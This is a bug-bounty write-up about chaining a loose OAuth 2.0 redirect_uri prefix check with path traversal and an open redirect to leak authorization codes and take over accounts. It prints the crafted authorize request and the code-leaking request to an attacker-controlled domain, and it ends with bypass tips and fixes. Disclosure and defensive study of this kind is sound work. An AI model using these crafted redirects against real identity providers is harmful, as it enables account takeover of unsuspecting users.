---
title: "How an OAuth 2.0 Redirect URI Bypass Led to Account Takeover and an $8,000 Bounty"
author: t4nv1
url: https://medium.com/@t4nv1/how-an-oauth-2-0-redirect-uri-bypass-led-to-account-takeover-and-an-8-000-bounty-ad67ba4b0db6
date_published: 2026-08-27
date_scraped: 2026-11-17
platform: medium
disclosed_report: none
bounty: $8,000
vuln_class: access-control
---

<!-- Raw scraped text below. Member-only Medium article; the user downloaded the full article legitimately to Manual_downloads/ (per project paywall rule) and it was folded in from there, citing the real source URL, not the freedium mirror. Target names are the author's redactions (analytics.platform.com, identity-provider.com). -->

# How an OAuth 2.0 Redirect URI Bypass Led to Account Takeover and an $8,000 Bounty

Published Aug 27, 2026. Enterprise analytics platform with SSO login via a third-party identity provider. Bounty: $8,000. Severity High/Critical. Vulnerability class: OAuth 2.0 Redirect URI Validation Bypass -> Account Takeover.

## Phase 1: Mapping the OAuth 2.0 flow

SSO login redirects the browser to the IdP authorization endpoint:

```
GET /oauth/v2/authorize?client_id=analytics_app_id&response_type=code&redirect_uri=https://analytics.platform.com/auth/callback&scope=openid%20profile%20email HTTP/1.1
Host: identity-provider.com
```

On consent the IdP returns the authorization code to the redirect_uri:

```
HTTP/1.1 302 Found
Location: https://analytics.platform.com/auth/callback?code=AUTH_CODE_TEMP_12345
```

The backend exchanges the code server-to-server for an access token.

## Phase 2: Testing redirect_uri validation

- Full domain change (`redirect_uri=https://attacker.com`): rejected.
- Subdomain append (`redirect_uri=https://attacker.analytics.platform.com`): rejected.
- Path traversal / query injection inside the path structure: anomaly.

Supplying an open-redirect path hosted on the client's own domain was approved:

```
GET /oauth/v2/authorize?client_id=analytics_app_id&response_type=code&redirect_uri=https://analytics.platform.com/auth/callback/../../redirect?url=https://attacker-controlled-domain.com HTTP/1.1
Host: identity-provider.com
```

The IdP validated redirect_uri with a loose domain/prefix match, not exact string matching. Because the value started with `https://analytics.platform.com/auth/callback`, it passed.

## The flaw: authorization code leakage

When the victim used the crafted link, the IdP authenticated them and issued:

```
HTTP/1.1 302 Found
Location: https://analytics.platform.com/auth/callback/../../redirect?url=https://attacker-controlled-domain.com&code=AUTH_CODE_LEAKED_67890
```

The client router resolved the `/auth/callback/../../redirect` traversal to its `/redirect` open-redirect utility, preserving the query string, so the browser followed on to the attacker domain with the code appended:

```
GET /?url=https://attacker-controlled-domain.com&code=AUTH_CODE_LEAKED_67890 HTTP/1.1
Host: attacker-controlled-domain.com
Referer: https://analytics.platform.com/
```

Flow: victim clicks crafted OAuth link -> IdP validates prefix match (success) -> redirects to client open redirect -> transmits code in query string -> attacker captures code -> exchanges it at the legitimate `/auth/callback` for the victim's session. Full account takeover, no credentials or further interaction.

## Triage and resolution

- Time to triage: 1 hour. Final award: $8,000.
- Fix: enforce exact string matching on all registered redirect_uri values (no wildcard/path matching); fix the open redirect on the client; implement PKCE.

## Critical lessons

- Test path traversal (`/../`) and matrix params (`;`) in redirect URIs to bypass path restrictions.
- Chain a loose redirect_uri validation flaw with a minor open redirect to escalate from informational to full ATO.
- Check whether the OAuth flow enforces PKCE (`code_challenge`/`code_verifier`), which stops intercepted codes being redeemed by a third party.
